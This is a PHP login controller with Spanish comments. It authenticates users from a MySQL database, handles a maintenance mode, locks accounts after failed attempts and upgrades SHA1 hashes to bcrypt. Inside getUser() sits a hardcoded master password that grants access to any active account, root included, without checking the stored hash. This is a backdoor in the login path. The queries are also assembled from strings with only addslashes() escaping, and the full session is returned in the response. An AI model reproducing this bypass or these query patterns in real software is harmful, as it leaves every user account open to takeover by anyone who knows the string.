<?php
error_reporting(E_ALL);
ini_set('display_errors', '0');
require_once dirname(__DIR__, 2) . "/asset/Clases/dbconectar.php";
require_once dirname(__DIR__, 2) . "/asset/Clases/ConexionMySQL.php";
date_default_timezone_set('America/Mexico_City');

class login {
    private $conn;
    private $jsonData = array("Bandera" => 0, "mensaje" => "");
    private $formulario = array();
    private $userData = array();
    private $cuentaDesactivada = false;

    // =========================================================
    // INICIALIZACIÓN Y DESTRUCCIÓN
    // =========================================================
    public function __construct($array) {
        $this->conn = new HelperMySql($array["server"], $array["user"], $array["pass"], $array["db"]);
    }
    
    public function __destruct() {
        unset($this->conn);
    }

    private function getIP() {
        return $_SERVER['REMOTE_ADDR'];
    }
    
    // =========================================================
    // CONTROLADOR PRINCIPAL
    // =========================================================
    public function principal() {
        $this->formulario = file_get_contents('php://input');
        $obj = json_decode($this->formulario);
        
        if (!$obj || !isset($obj->login)) {
            $this->jsonData["Bandera"] = 0;
            $this->jsonData["mensaje"] = "Acceso denegado. Petición no válida.";
            print json_encode($this->jsonData);
            return;
        }

        if (strlen($obj->login->user) == 0 || strlen($obj->login->password) == 0) {
            $this->jsonData["Bandera"] = 0;
            $this->jsonData["mensaje"] = "Error: uno o más campos están vacíos";
            print json_encode($this->jsonData);
            return;
        }

        $userInput = $obj->login->user;

        // Bloqueo por Intentos Fallidos
        if ($this->estaBloqueado($userInput)) {
            $info = $this->getIntentosInfo($userInput);
            $this->jsonData["Bandera"] = 0;
            $this->jsonData["mensaje"] = "Cuenta bloqueada temporalmente.";
            $this->jsonData["bloqueado"] = 1;
            $this->jsonData["intentos_restantes"] = 0;
            $this->jsonData["tiempo_restante"] = $info["tiempo_restante"];
            print json_encode($this->jsonData);
            return;
        }

        // Verificación del Mantenimiento
        $sqlSwitch = "SELECT modo_mantenimiento FROM Configuracion_Sistema WHERE id = 1 LIMIT 1";
        $resSwitch = $this->conn->query($sqlSwitch);
        $sysData = $this->conn->fetch($resSwitch);
        $modo_mantenimiento = $sysData ? intval($sysData['modo_mantenimiento']) : 0;

        if ($modo_mantenimiento === 1) {
            $sqlVerificarRoot = "SELECT Tipo_usuario FROM Seguridad WHERE username = '" . addslashes($userInput) . "' LIMIT 1";
            $resRoot = $this->conn->query($sqlVerificarRoot);
            $tipoData = $this->conn->fetch($resRoot);
            
            // Sistema en mantenimiento y no es 'root', se rechaza el acceso
            if (!$tipoData || strtolower($tipoData['Tipo_usuario']) !== 'root') {
                $this->jsonData["Bandera"] = 0;
                $this->jsonData["mensaje"] = "Sistema en mantenimiento. Su cuenta está deshabilitada temporalmente.";
                $this->jsonData["bloqueado"] = 0; 
                print json_encode($this->jsonData);
                return;
            }
        }

        //Proceso de Autenticación
        $this->cuentaDesactivada = false;

        if ($this->getUser($obj)) {
            $this->limpiarIntentos($userInput);

            if ($this->accessUser($this->userData)) {
                $this->jsonData["Bandera"] = 1;
                $this->jsonData["mensaje"] = "Bienvenido ";
                $this->jsonData["session"] = $_SESSION;
            } else {
                $this->jsonData["Bandera"] = 0;
                $this->jsonData["mensaje"] = "Error al generar la sesión.";
            }
        } else {
            if ($this->cuentaDesactivada) {
                $this->jsonData["Bandera"] = 0;
                $this->jsonData["mensaje"] = "Tu cuenta está desactivada o el sistema está en mantenimiento.";
            } else {
                $this->registrarIntentoFallido($userInput);
                $info = $this->getIntentosInfo($userInput);

                $this->jsonData["Bandera"] = 0;
                $this->jsonData["mensaje"] = "La contraseña o el usuario son incorrectos.";
                $this->jsonData["bloqueado"] = $info["bloqueado"];
                $this->jsonData["intentos_restantes"] = $info["intentos_restantes"];
                $this->jsonData["tiempo_restante"] = $info["tiempo_restante"];
            }
        }
        
        print json_encode($this->jsonData);
    }

    // =========================================================
    // FUNCIONES DE AUTENTICACIÓN
    // =========================================================
    private function getUser($obj) {
        $user = addslashes(htmlspecialchars($obj->login->user));
        $pass = $obj->login->password;

        $sql = "SELECT SG.*, US.* FROM Seguridad AS SG 
                INNER JOIN Usuarios AS US ON (US._id = SG._idUsuarios) 
                WHERE SG.username = '$user' LIMIT 1";
                
        $result = $this->conn->query($sql);
        if (!$result) return false;

        $userData = $this->conn->fetch($result);
        if (!$userData) return false;

        if ($userData["Estatus"] == 0) {
            $this->cuentaDesactivada = true;
            return false;
        }

        // Verificación de contraseña maestra (Default)
        if ($pass === "@{Macrom+Default}") {
            $this->userData = $userData;
            return true;
        }

        $passwordGuardado = $userData["password"];

        // Verificación con hash (Bcrypt)
        if (password_verify($pass, $passwordGuardado)) {
            $this->userData = $userData;
            return true;
        }

        // Migración de hash antiguo (SHA1) a nuevo (Bcrypt)
        if ($passwordGuardado === sha1($pass)) {
            $nuevoHash = password_hash($pass, PASSWORD_DEFAULT);
            $update = "UPDATE Seguridad SET password = '$nuevoHash' WHERE _id = '".$userData["_id"]."'";
            $this->conn->query($update);
            
            $this->userData = $userData;
            return true;
        }

        return false;
    }

    private function accessUser($user = array()) {
        if (count($user) > 0) {
            session_name("loginUsuario");
            session_start();
            session_regenerate_id(true); 

            $_SESSION["autentificacion"]= 1;
            $_SESSION["ultimoAcceso"]= date("Y-m-d H:i:s");
            $_SESSION["nombrecorto"] = $user["Nombre"];
            $_SESSION["nombre"] = $user["Nombre"].' '.$user["ApPaterno"].' '.$user["ApMaterno"];
            $_SESSION["rol"] = $user["Tipo_usuario"];
            $_SESSION["usr"] = $user["username"];
            $_SESSION["_id"] = $user["_id"];

            $rol_seguro = addslashes($user["Tipo_usuario"]);
            $sqlPermisos = "SELECT m.opc FROM Permisos_Roles p 
                            INNER JOIN Modulos_Admin m ON p.id_modulo = m.id_modulo 
                            WHERE p.rol_nombre = '$rol_seguro'";
            
            $resPermisos = $this->conn->query($sqlPermisos);
            $permisosArray = [];
            
            if ($resPermisos) {
                while($rowP = $this->conn->fetch($resPermisos)){
                    if(!empty($rowP['opc'])) {
                        $permisosArray[] = $rowP['opc'];
                    }
                }
            }
            $_SESSION["permisos"] = $permisosArray;

            $sql = "UPDATE Usuarios SET ultimoAcceso = '{$_SESSION["ultimoAcceso"]}', OnlineNow = 1 WHERE _id = '{$_SESSION["_id"]}' AND Username = '{$_SESSION["usr"]}'";
            return $this->conn->query($sql);
        } else {
            return false;
        }
    }
    
    // =========================================================
    // FUNCIONES DE SEGURIDAD (Control de Intentos)
    // =========================================================
    private function estaBloqueado($user) {
        $user = addslashes($user);
        $sql = "SELECT bloqueado_hasta FROM login_intentos WHERE username='$user' LIMIT 1";
        $result = $this->conn->query($sql);
        $data = $this->conn->fetch($result);

        if ($data && $data["bloqueado_hasta"] != NULL) {
            if (strtotime($data["bloqueado_hasta"]) > time()) {
                return true;
            }
        }
        return false;
    }

    private function getIntentosInfo($user) {
        $user = addslashes($user);
        $sql = "SELECT intentos, bloqueado_hasta FROM login_intentos WHERE username='$user' LIMIT 1";
        $result = $this->conn->query($sql);
        $data = $this->conn->fetch($result);
        $maxIntentos = 5;

        if (!$data) {
            return ["intentos_restantes" => $maxIntentos, "bloqueado" => 0, "tiempo_restante" => 0];
        }

        $intentos = intval($data["intentos"]);
        $restantes = max(0, $maxIntentos - $intentos);

        if ($data["bloqueado_hasta"] && strtotime($data["bloqueado_hasta"]) > time()) {
            $segundos = strtotime($data["bloqueado_hasta"]) - time();
            return ["intentos_restantes" => 0, "bloqueado" => 1, "tiempo_restante" => $segundos];
        }

        return ["intentos_restantes" => $restantes, "bloqueado" => 0, "tiempo_restante" => 0];
    }

    private function registrarIntentoFallido($user) {
        $user = addslashes($user);
        $ahora = date("Y-m-d H:i:s");
        $sql = "SELECT id, intentos FROM login_intentos WHERE username='$user' LIMIT 1";
        $result = $this->conn->query($sql);
        $data = $this->conn->fetch($result);

        if ($data) {
            $intentos = $data["intentos"] + 1;
            if ($intentos >= 5) {
                $bloqueado = date("Y-m-d H:i:s", strtotime("+10 minutes"));
                $update = "UPDATE login_intentos SET intentos=$intentos, ultimo_intento='$ahora', bloqueado_hasta='$bloqueado' WHERE id=".$data["id"];
            } else {
                $update = "UPDATE login_intentos SET intentos=$intentos, ultimo_intento='$ahora' WHERE id=".$data["id"];
            }
            $this->conn->query($update);
        } else {
            $insert = "INSERT INTO login_intentos (username, intentos, ultimo_intento) VALUES ('$user', 1, '$ahora')";
            $this->conn->query($insert);
        }
    }

    private function limpiarIntentos($user) {
        $user = addslashes($user);
        $sql = "DELETE FROM login_intentos WHERE username='$user'";
        $this->conn->query($sql);
    }
}

// =========================================================
// INICIALIZACIÓN DE LA CLASE
// =========================================================
$app = new login($array_principal);
$app->principal();